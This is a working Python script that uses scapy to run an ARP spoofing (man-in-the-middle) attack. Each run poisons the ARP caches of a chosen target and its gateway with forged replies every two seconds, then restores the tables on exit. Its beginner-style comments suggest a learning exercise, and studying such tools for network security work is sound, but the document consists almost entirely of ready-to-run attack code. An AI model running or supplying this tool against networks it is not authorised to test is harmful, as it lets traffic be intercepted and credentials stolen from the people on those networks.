#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse

def spoof(target_ip,targetmac, spoof_ip):
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=targetmac ,psrc=spoof_ip)
    scapy.send(packet, verbose=False) #Verbose stops the module printing constantly.



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) # getting an arp request ready for the broadcast ip address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # getting the arp request ready for the broadcast mac address
    arp_request_broadcast = broadcast/arp_request # combining the 2 things above to get the packet ready.
    mylist= scapy.srp(arp_request_broadcast,timeout= 1,verbose = False)[0] #broadcasting the arp packet, timeout = 1 neccessary, verbose gets rid of an unneeded part out of output and [0] prints out whats needed from the list
    if not mylist:
        print("Could not get a MAC address")
        exit()
    else: return mylist[0][1].hwsrc

def restore(dest_ip, src_ip):
    destination_mac= get_mac(dest_ip)
    src_mac= get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst= destination_mac, psrc= src_ip, hwsrc= src_mac)
    scapy.send(packet,count=4, verbose=False)

def get_args():
    parser = optparse.OptionParser()  # defining the parser
    parser.add_option("-t", "--target", dest="target",help="Target ip")  # adding an option for command line arguments
    parser.add_option("-g", "--gateway", dest="gateway",help="gateway")  # adding an option for command line arguments
    (options, arguments) = parser.parse_args()  # defining 2 variables based on the options give. Options is all we need, args is the list of left over arguments, for example if -i is defined but -m isnt
    if not options.target:
            # code to handle error
        parser.error("Please specify a target ip")
    elif not options.gateway:
            # code to handle error
        parser.error("Please specify a gateway ip")
    return options

count= 0


options=get_args()
target_ip= options.target
gateway_ip= options.gateway

try:
    count = 0
    target_mac=get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    while True:
        spoof(target_ip, target_mac,gateway_ip)
        spoof(gateway_ip, gateway_mac,target_ip)
        count = count + 2
        print("\rPackets sent: " + str(count)), #prints without a new line thats what the comma does. Needs the flush command below to actually print. The \r makes it so that it refreshes the line, not constantly printing new stuff.
        sys.stdout.flush() #this is making python output the print statements.
        #python 3 code for print above:
        #print("\rPackets sent: " + str(count), end="") The end makes it refresh if its set to nothing, will add nothing to the end of the print statement.
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip,gateway_ip)
    restore(gateway_ip, target_ip)
    print("Resetting ARP tables")
    print("Quitting...")
